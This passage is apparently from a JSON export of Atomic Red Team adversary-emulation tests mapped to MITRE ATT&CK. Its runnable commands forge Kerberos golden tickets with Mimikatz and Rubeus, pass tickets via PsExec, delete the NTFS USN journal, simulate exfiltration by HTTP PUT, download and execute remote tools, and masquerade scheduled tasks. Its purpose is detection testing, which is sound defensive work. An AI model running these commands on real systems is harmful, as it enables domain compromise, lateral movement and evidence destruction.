$krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value\n  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))\n}\n\n# create batch file with commands to run in a separate \"runas /netonly\" session\n# so we don't purge Kerberos ticket from the current Windows session\n# its output goes to golden.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\n@\"\n>%TEMP%\\golden.txt 2>&1 (\n  echo Purge existing tickets and create golden ticket:\n  klist purge\n  #{mimikatz_path} \"kerberos::golden /domain:#{domain} /sid:DOMAIN_SID /aes256:#{krbtgt_aes256_key} /user:#{account} /ptt\" \"exit\"\n\n  echo.\n  echo Requesting SYSVOL:\n  dir \\\\#{domain}\\SYSVOL\n  \n  echo.\n  echo Tickets after requesting SYSVOL:\n  klist\n\n  echo.\n  echo End of Golden Ticket attack\n)\n\"@ -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\golden.bat\n\n# run batch file in a new empty session (password and username do not matter)\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null\n\n# wait until the output file has logged the entire attack\ndo {\n  Start-Sleep 1 # wait a bit so the output file has time to be created\n  Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {\n    if ($_ -match 'End of Golden Ticket attack') { break } \n  }\n} while ($false) # dummy loop so that 'break' can be used\n\n# show output from new empty session\nGet-Content $env:TEMP\\golden.txt\n\n# cleanup temp files\nRemove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n"}}, {"name": "Crafting Active Directory golden tickets with Rubeus", "auto_generated_guid": "e42d33cd-205c-4acf-ab59-a9f38f6bad9c", "description": "Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the Active Directory domain.\nThis test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).\nThe generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.\n", "supported_platforms": ["windows"], "input_arguments": {"domaincontroller": {"description": "Targeted Active Directory domain FQDN", "type": "string", "default": "$ENV:logonserver.TrimStart('\\') + \".\" + \"$ENV:userdnsdomain\""}, "account": {"description": "Account to impersonate", "type": "string", "default": "$ENV:username"}, "krbtgt_aes256_key": {"description": "Krbtgt AES256 key (you will need to set to match your krbtgt key for your domain)", "type": "string", "default": "b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9"}, "local_folder": {"description": "Local path of Rubeus executable", "type": "path", "default": "$Env:temp"}, "local_executable": {"description": "name of the rubeus executable", "type": "string", "default": "rubeus.exe"}, "rubeus_url": {"description": "URL of Rubeus executable", "type": "url", "default": "https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Computer must be domain joined\n", "prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n", "get_prereq_command": "Write-Host Joining this computer to a domain must be done manually\n"}, {"description": "Rubeus must exist\n", "prereq_command": "if(Test-Path -Path #{local_folder}\\#{local_executable}) {exit 0} else {exit 1}\n", "get_prereq_command": "Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{local_folder}\\#{local_executable}\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n\ncmd.exe /c \"#{local_folder}\\#{local_executable}\" golden /aes256:#{krbtgt_aes256_key} /ldap /user:#{account} /dc:$(#{domaincontroller}) /printcmd /outfile:golden\n$filename = (Get-ChildItem | ? {$_.Name.startswith(\"golden_\")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name\n\n# create batch file with commands to run in a separate \"runas /netonly\" session\n# so we don't purge Kerberos ticket from the current Windows session\n# its output goes to golden.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\n@\"\n>%TEMP%\\golden.txt 2>&1 (\n  echo Purge existing tickets and create golden ticket:\n  klist purge\n  cd %temp%\n  \"#{local_folder}\\#{local_executable}\" ptt /ticket:kirbifile\n\n  echo.\n  echo Requesting SYSVOL:\n  dir \\\\$(#{domaincontroller})\\SYSVOL\n  \n  echo.\n  echo Tickets after requesting SYSVOL:\n  klist\n\n  echo.\n  echo End of Golden Ticket attack\n)\n\"@ -Replace \"kirbifile\", $filename | Out-File -Encoding OEM $env:TEMP\\golden.bat\n\n# run batch file in a new empty session (password and username do not matter)\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null\n\n# wait until the output file has logged the entire attack\ndo {\n  Start-Sleep 1 # wait a bit so the output file has time to be created\n  Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {\n    if ($_ -match 'End of Golden Ticket attack') { break } \n  }\n} while ($false) # dummy loop so that 'break' can be used\n\n# show output from new empty session\nGet-Content $env:TEMP\\golden.txt\n\n# cleanup temp files\nRemove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n"}}]}, "T1020": {"name": "Automated Exfiltration", "technique_id": "attack-pattern--774a3188-6ba9-4dc4-879d-d54ee48a5ce9", "external_id": "T1020", "data_components": ["Network Connection Creation", "Network Traffic Flow", "Network Traffic Content", "Command Execution", "File Access", "Script Execution"], "kill_chain_phases": ["exfiltration"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection. \n\nWhen automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) and [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).", "atomic_tests": [{"name": "IcedID Botnet HTTP PUT", "auto_generated_guid": "9c780d3d-3a14-4278-8ee5-faaeb2ccfbe0", "description": "Creates a text file\nTries to upload to a server via HTTP PUT method with ContentType Header\nDeletes a created file", "supported_platforms": ["windows"], "input_arguments": {"file": {"description": "Exfiltration File", "type": "string", "default": "C:\\temp\\T1020_exfilFile.txt"}, "domain": {"description": "Destination Domain", "type": "url", "default": "https://google.com"}}, "executor": {"command": "$fileName = \"#{file}\"\n$url = \"#{domain}\"\n$file = New-Item -Force $fileName -Value \"This is ART IcedID Botnet Exfil Test\"\n$contentType = \"application/octet-stream\"\ntry {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}", "cleanup_command": "$fileName = \"#{file}\"\nRemove-Item -Path $fileName -ErrorAction Ignore", "name": "powershell"}}]}, "T1070": {"name": "Indicator Removal", "technique_id": "attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69", "external_id": "T1070", "data_components": ["User Account Authentication", "File Modification", "Windows Registry Key Modification", "User Account Deletion", "OS API Execution", "Windows Registry Key Deletion", "Scheduled Job Modification", "Application Log Content", "Network Traffic Content", "Process Creation", "File Deletion", "Firewall Rule Modification", "File Metadata", "Command Execution"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--20a2baeb-98c2-4901-bad7-dc62d0a03dea", "course-of-action--987988f0-cf86-4680-a875-2f6456ab2448", "course-of-action--feff9142-e8c2-46f4-842b-bd6fb3d41157"], "description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.", "atomic_tests": [{"name": "Indicator Removal using FSUtil", "auto_generated_guid": "b4115c7a-0e92-47f0-a61e-17e7218b2435", "description": "Manages the update sequence number (USN) change journal, which provides a persistent log of all changes made to files on the volume. Upon execution, no output\nwill be displayed. More information about fsutil can be found at https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-usn\n", "supported_platforms": ["windows"], "executor": {"command": "fsutil usn deletejournal /D C:\n", "cleanup_command": "fsutil usn createjournal m=1000 a=100 c:\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Indicator Manipulation using FSUtil", "auto_generated_guid": "96e86706-6afd-45b6-95d6-108d23eaf2e9", "description": "Finds a file by user name (if Disk Quotas are enabled), queries allocated ranges for a file, sets a file's short name, sets a file's valid data length, sets zero data for a file, or creates a new file. Upon execution, no output\nwill be displayed. More information about fsutil can be found at https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-file\n- https://tria.ge/230601-x8x6bsgb24/behavioral2\n", "supported_platforms": ["windows"], "input_arguments": {"file_to_manipulate": {"description": "Path of file to manipulate", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1070-2.txt"}, "file_data_length": {"description": "Data length to setzero", "type": "integer", "default": 10}}, "executor": {"command": "if (-not (Test-Path \"#{file_to_manipulate}\")) { New-Item \"#{file_to_manipulate}\" -Force } \necho \"1234567890\" > \"#{file_to_manipulate}\"\nfsutil  file setZeroData offset=0 length=#{file_data_length} \"#{file_to_manipulate}\"\n", "cleanup_command": "rm \"#{file_to_manipulate}\"\n", "name": "powershell", "elevation_required": false}}]}, "T1550.003": {"name": "Pass the Ticket", "technique_id": "attack-pattern--7b211ac6-c815-4189-93a9-ab415deca926", "external_id": "T1550.003", "data_components": ["Logon Session Creation", "User Account Authentication", "Active Directory Credential Request"], "kill_chain_phases": ["defense-evasion", "lateral-movement"], "data_source_platforms": [], "mitigations": ["course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485", "course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--e3388c78-2a8d-47c2-8422-c1398b324462"], "description": "Adversaries may \u201cpass the ticket\u201d using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.\n\nWhen preforming PtT, valid Kerberos tickets for [Valid Accounts](https://attack.mitre.org/techniques/T1078) are captured by [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.(Citation: ADSecurity AD Kerberos Attacks)(Citation: GentilKiwi Pass the Ticket)\n\nA [Silver Ticket](https://attack.mitre.org/techniques/T1558/002) can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).(Citation: ADSecurity AD Kerberos Attacks)\n\nA [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.(Citation: Campbell 2014)\n\nAdversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, \"overpassing the hash\" involves using a NTLM password hash to authenticate as a user (i.e. [Pass the Hash](https://attack.mitre.org/techniques/T1550/002)) while also using the password hash to create a valid Kerberos ticket.(Citation: Stealthbits Overpass-the-Hash)", "atomic_tests": [{"name": "Mimikatz Kerberos Ticket Attack", "auto_generated_guid": "dbf38128-7ba7-4776-bedf-cc2eed432098", "description": "Similar to PTH, but attacking Kerberos\n", "supported_platforms": ["windows"], "input_arguments": {"ticket": {"description": "Ticket file name usually format of 'id-username\\@domain.kirbi' (e.g. can be dumped by \"sekurlsa::tickets /export\" module)", "type": "string", "default": null}, "mimikatz_exe": {"description": "Path of the Mimikatz binary", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\bin\\x64\\mimikatz.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Mimikatz must exist on disk at specified location (#{mimikatz_exe})\n", "prereq_command": "if (Test-Path \"#{mimikatz_exe}\") {exit 0} else {exit 1}\n", "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$basePath = Split-Path \"#{mimikatz_exe}\" | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"}], "executor": {"command": "\"#{mimikatz_exe}\" \"kerberos::ptt #{ticket}\"\n", "name": "command_prompt"}}, {"name": "Rubeus Kerberos Pass The Ticket", "auto_generated_guid": "a2fc4ec5-12c6-4fb4-b661-961f23f359cb", "description": "Requesting a TGT on a remote system and retrieving it locally before requesting a service ticket with it. This is a Pass-The-Ticket attack because the TGT is obtained on the remote system, then used from a different machine (local).\nPsExec is used to execute commands on the remote system, and the \"C$\" admin share is used to retrieve the TGT, so the current user must have admin rights remotely and other PsExec prerequisites must be met.\n", "supported_platforms": ["windows"], "input_arguments": {"target": {"description": "Remote system to request the TGT from", "type": "string", "default": "localhost"}, "user_name": {"description": "username associated with the ticket (privileged account not required)", "type": "string", "default": "Administrator"}, "password": {"description": "password for user_name", "type": "string", "default": "Password"}, "domain": {"description": "domain", "type": "string", "default": "$Env:USERDOMAIN"}, "rubeus_url": {"description": "URL of Rubeus executable", "type": "url", "default": "https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Rubeus must exist on disk at \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\"\n", "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-Webrequest -Uri #{rubeus_url} -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\"\n"}, {"description": "PsExec must exist on disk at \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\"\n", "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\") {exit 0} else {exit 1}\n", "get_prereq_command": "Invoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\" -Force\nNew-Item -ItemType Directory (Split-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\") -Force | Out-Null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" -Force\n"}], "executor": {"name": "powershell", "elevation_required": true, "command": "& \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" -accepteula \\\\#{target} -w c:\\ -c \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\" asktgt /user:#{user_name} /password:#{password} /domain:#{domain} /outfile:ticket.kirbi\nSet-Location \"PathToAtomicsFolder\\..\\ExternalPayloads\"\nMove-Item -Force \"\\\\#{target}\\c$\\ticket.kirbi\" ticket.kirbi\nWrite-Host \"Successfully retrieved TGT from '#{target}', now requesting a TGS from local\"\n& \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\" asktgs /service:cifs/#{target} /ticket:ticket.kirbi /ptt\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\ticket.kirbi\"\n& \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\" purge      "}}]}, "T1609": {"name": "Container Administration Command", "technique_id": "attack-pattern--7b50a1d3-4ca7-45d1-989d-a6503f04bfe1", "external_id": "T1609", "data_components": ["Process Creation", "Command Execution"], "kill_chain_phases": ["execution"], "data_source_platforms": [], "mitigations": ["course-of-action--1dcaeb21-9348-42ea-950a-f842aaf1ae1f", "course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db", "course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31"], "description": "Adversaries may abuse a container administration service to execute commands within a container. A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment.(Citation: Docker Daemon CLI)(Citation: Kubernetes API)(Citation: Kubernetes Kubelet)\n\nIn Docker, adversaries may specify an entrypoint during container deployment that executes a script or command, or they may use a command such as <code>docker exec</code> to execute a command within a running container.(Citation: Docker Entrypoint)(Citation: Docker Exec) In Kubernetes, if an adversary has sufficient permissions, they may gain remote execution in a container in the cluster via interaction with the Kubernetes API server, the kubelet, or by running a command such as <code>kubectl exec</code>.(Citation: Kubectl Exec Get Shell)", "atomic_tests": [{"name": "ExecIntoContainer", "auto_generated_guid": "d03bfcd3-ed87-49c8-8880-44bb772dea4b", "description": "Attackers who have permissions, can run malicious commands in containers in the cluster using exec command (\u201ckubectl exec\u201d). In this method, attackers can use legitimate images, such as an OS image (e.g., Ubuntu) as a backdoor container, and run their malicious code remotely by using \u201ckubectl exec\u201d.\n", "supported_platforms": ["containers"], "input_arguments": {"namespace": {"description": "K8s namespace to use", "type": "string", "default": "default"}, "command": {"description": "Command to run", "type": "string", "default": "uname"}, "path": {"description": "Path to busybox.yaml file", "type": "string", "default": "$PathtoAtomicsFolder/T1609/src/busybox.yaml"}}, "dependencies": [{"description": "kubectl must be installed\n", "get_prereq_command": "echo \"kubectl must be installed manually\"\n", "prereq_command": "which kubectl\n"}], "executor": {"command": "kubectl create -f #{path} -n #{namespace}\n# wait 3 seconds for the instance to come up\nsleep 3\nkubectl exec -n #{namespace} busybox -- #{command}\n", "cleanup_command": "kubectl delete pod busybox -n #{namespace}\n", "name": "bash", "elevation_required": false}}, {"name": "Docker Exec Into Container", "auto_generated_guid": "900e2c49-221b-42ec-ae3c-4717e41e6219", "description": "Attackers who have permissions, can run malicious commands in containers in the cluster using exec command (\u201cdocker exec\u201d). In this method, attackers can use legitimate images, such as an OS image (e.g., Ubuntu) as a backdoor container, and run their malicious code remotely by using \u201cdocker exec\u201d. Kinsing (Golang-based malware) was executed with an Ubuntu container entry point that runs shell scripts.\n", "supported_platforms": ["containers"], "dependencies": [{"description": "docker must be installed\n", "get_prereq_command": "if [ \"\" == \"`which docker`\" ]; then echo \"Docker Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install docker ; elif [ -n \"`which yum`\" ]; then sudo yum -y install docker ; fi ; else echo \"Docker installed\"; fi\n", "prereq_command": "which docker\n"}], "executor": {"command": "docker build -t t1609  $PathtoAtomicsFolder/T1609/src/ \ndocker run --name t1609_container --rm -itd t1609 bash /tmp/script.sh\ndocker exec -i t1609_container bash -c \"cat /tmp/output.txt\"\n", "cleanup_command": "docker stop t1609_container\ndocker rmi -f t1609:latest \n", "name": "bash", "elevation_required": false}}]}, "T1083": {"name": "File and Directory Discovery", "technique_id": "attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18", "external_id": "T1083", "data_components": ["OS API Execution", "Process Creation", "Command Execution"], "kill_chain_phases": ["discovery"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>.(Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the [Native API](https://attack.mitre.org/techniques/T1106). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).(Citation: US-CERT-TA18-106A)", "atomic_tests": [{"name": "File and Directory Discovery (cmd.exe)", "auto_generated_guid": "0e36303b-6762-4500-b003-127743b80ba6", "description": "Find or discover files on the file system.  Upon successful execution, this test will output the results of all the data discovery commands to a specified file.\n", "supported_platforms": ["windows"], "input_arguments": {"output_file": {"description": "File to output results to", "type": "string", "default": "%temp%\\T1083Test1.txt"}}, "executor": {"command": "dir /s c:\\ >> #{output_file}\ndir /s \"c:\\Documents and Settings\" >> #{output_file}\ndir /s \"c:\\Program Files\\\" >> #{output_file}\ndir \"%systemdrive%\\Users\\*.*\" >> #{output_file}\ndir \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*.*\" >> #{output_file}\ndir \"%userprofile%\\Desktop\\*.*\" >> #{output_file}\ntree /F >> #{output_file}\n", "cleanup_command": "del #{output_file}\n", "name": "command_prompt"}}, {"name": "File and Directory Discovery (PowerShell)", "auto_generated_guid": "2158908e-b7ef-4c21-8a83-3ce4dd05a924", "description": "Find or discover files on the file system. Upon execution, file and folder information will be displayed.\n", "supported_platforms": ["windows"], "executor": {"command": "ls -recurse\nget-childitem -recurse\ngci -recurse\n", "name": "powershell"}}, {"name": "Nix File and Directory Discovery", "auto_generated_guid": "ffc8b249-372a-4b74-adcd-e4c0430842de", "description": "Find or discover files on the file system\n\nReferences:\n\nhttp://osxdaily.com/2013/01/29/list-all-files-subdirectory-contents-recursively/\n\nhttps://perishablepress.com/list-files-folders-recursively-terminal/\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"output_file": {"description": "Output file used to store the results.", "type": "path", "default": "/tmp/T1083.txt"}}, "executor": {"command": "ls -a >> #{output_file}\nif [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > #{output_file}; fi;\nfile */* *>> #{output_file}\ncat #{output_file} 2>/dev/null\nfind . -type f\nls -R | grep \":$\" | sed -e 's/:$//' -e 's/[^-][^\\/]*\\//--/g' -e 's/^/ /' -e 's/-/|/'\nlocate *\nwhich sh\n", "cleanup_command": "rm #{output_file}\n", "name": "sh"}}, {"name": "Nix File and Directory Discovery 2", "auto_generated_guid": "13c5e1ae-605b-46c4-a79f-db28c77ff24e", "description": "Find or discover files on the file system\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"output_file": {"description": "Output file used to store the results.", "type": "path", "default": "/tmp/T1083.txt"}}, "executor": {"command": "cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > #{output_file}\nif [ -f /etc/mtab ]; then cat /etc/mtab >> #{output_file}; fi;\nfind . -type f -iname *.pdf >> #{output_file}\ncat #{output_file}\nfind . -type f -name \".*\"\n", "cleanup_command": "rm #{output_file}", "name": "sh"}}, {"name": "Simulating MAZE Directory Enumeration", "auto_generated_guid": "c6c34f61-1c3e-40fb-8a58-d017d88286d8", "description": "This test emulates MAZE ransomware's ability to enumerate directories using Powershell. \nUpon successful execution, this test will output the directory enumeration results to a specified file, as well as display them in the active window. \nSee https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents\n", "supported_platforms": ["windows"], "input_arguments": {"File_to_output": {"description": "File to output results to", "type": "string", "default": "$env:temp\\T1083Test5.txt"}}, "executor": {"command": "$folderarray = @(\"Desktop\", \"Downloads\", \"Documents\", \"AppData/Local\", \"AppData/Roaming\")\nGet-ChildItem -Path $env:homedrive -ErrorAction SilentlyContinue | Out-File -append #{File_to_output}\nGet-ChildItem -Path $env:programfiles -erroraction silentlycontinue | Out-File -append #{File_to_output}\nGet-ChildItem -Path \"${env:ProgramFiles(x86)}\" -erroraction silentlycontinue | Out-File -append #{File_to_output}\n$UsersFolder = \"$env:homedrive\\Users\\\"\nforeach ($directory in Get-ChildItem -Path $UsersFolder -ErrorAction SilentlyContinue) \n{\nforeach ($secondarydirectory in $folderarray)\n {Get-ChildItem -Path \"$UsersFolder/$directory/$secondarydirectory\" -ErrorAction SilentlyContinue | Out-File -append #{File_to_output}}\n}\ncat #{File_to_output}\n", "cleanup_command": "remove-item #{File_to_output} -ErrorAction SilentlyContinue\n", "name": "powershell"}}, {"name": "Launch DirLister Executable", "auto_generated_guid": "c5bec457-43c9-4a18-9a24-fe151d8971b7", "description": "Launches the DirLister executable for a short period of time and then exits.\n\nRecently seen used by [BlackCat ransomware](https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/) to create a list of accessible directories and files.", "supported_platforms": ["windows"], "input_arguments": {"dirlister_path": {"description": "Path to the DirLister executable ", "type": "string", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\DirLister.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "DirLister.exe must exist in the specified path #{dirlister_path}\n", "prereq_command": "if (Test-Path \"#{dirlister_path}\") {exit 0} else {exit 1}\n", "get_prereq_command": "$parentpath = Split-Path \"#{dirlister_path}\"\nNew-Item -ItemType Directory -Force -Path $parentpath | Out-Null\nInvoke-WebRequest https://github.com/SanderSade/DirLister/releases/download/v2.beta4/DirLister.v2.beta4.zip -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\TDirLister.v2.beta4.zip\"\nExpand-Archive -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\TDirLister.v2.beta4.zip\" -DestinationPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\TDirLister.v2.beta4\" -Force\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\TDirLister.v2.beta4\\*\" \"$parentpath\" -Recurse\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\TDirLister.v2.beta4.zip\",\"PathToAtomicsFolder\\..\\ExternalPayloads\\TDirLister.v2.beta4\" -Recurse -ErrorAction Ignore\n"}], "executor": {"command": "Start-Process \"#{dirlister_path}\"\nStart-Sleep -Second 4\nStop-Process -Name \"DirLister\"\n", "name": "powershell"}}]}, "T1036.004": {"name": "Masquerade Task or Service", "technique_id": "attack-pattern--7bdca9d5-d500-4d7d-8c52-5fd47baf4c0c", "external_id": "T1036.004", "data_components": ["Scheduled Job Modification", "Scheduled Job Metadata", "Service Creation", "Command Execution", "Service Metadata"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description.(Citation: TechNet Schtasks)(Citation: Systemd Service Units) Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\n\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Fysbis Dr Web Analysis)", "atomic_tests": [{"name": "Creating W32Time similar named service using schtasks", "auto_generated_guid": "f9f2fe59-96f7-4a7d-ba9f-a9783200d4c9", "description": "Creating W32Time similar named service (win32times) using schtasks just like threat actor dubbed \"Operation Wocao\"", "supported_platforms": ["windows"], "executor": {"command": "schtasks /create /ru system /sc daily /tr \"cmd /c powershell.exe -ep bypass -file c:\\T1036.004_NonExistingScript.ps1\" /tn win32times /f\nschtasks /query /tn win32times\n", "cleanup_command": "schtasks /tn win32times /delete /f\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Creating W32Time similar named service using sc", "auto_generated_guid": "b721c6ef-472c-4263-a0d9-37f1f4ecff66", "description": "Creating W32Time similar named service (win32times) using sc just like threat actor dubbed \"Operation Wocao\"", "supported_platforms": ["windows"], "executor": {"command": "sc create win32times binPath= \"cmd /c start c:\\T1036.004_NonExistingScript.ps1\"\nsc qc win32times\n", "cleanup_command": "sc delete win32times\n", "name": "command_prompt", "elevation_required": true}}, {"name": "linux rename /proc/pid/comm using prctl", "auto_generated_guid": "f0e3aaea-5cd9-4db6-a077-631dd19b27a8", "description": "Runs a C program that calls prctl(PR_SET_NAME) to modify /proc/pid/comm value to \"totally_legit\".  This will show up as process name in simple 'ps' listings.\n", "supported_platforms": ["linux"], "input_arguments": {"exe_path": {"description": "Output Binary Path", "type": "path", "default": "/tmp/T1036_004_prctl_rename"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "#{exe_path} must be exist on system.\n", "prereq_command": "stat #{exe_path}\n", "get_prereq_command": "cc -o #{exe_path} PathToAtomicsFolder/T1036.004/src/prctl_rename.c\n"}], "executor": {"name": "sh", "command": "#{exe_path} & ps\nTMP=`ps | grep totally_legit`\nif [ -z \"${TMP}\" ] ; then echo \"renamed process NOT FOUND in process list\" && exit 1; fi\nexit 0\n", "cleanup_command": "rm -f #{exe_path}\n"}}]}, "T1055.004": {"name": "Asynchronous Procedure Call", "technique_id": "attack-pattern--7c0f17c9-1af6-4628-9cbd-9e45482dd605", 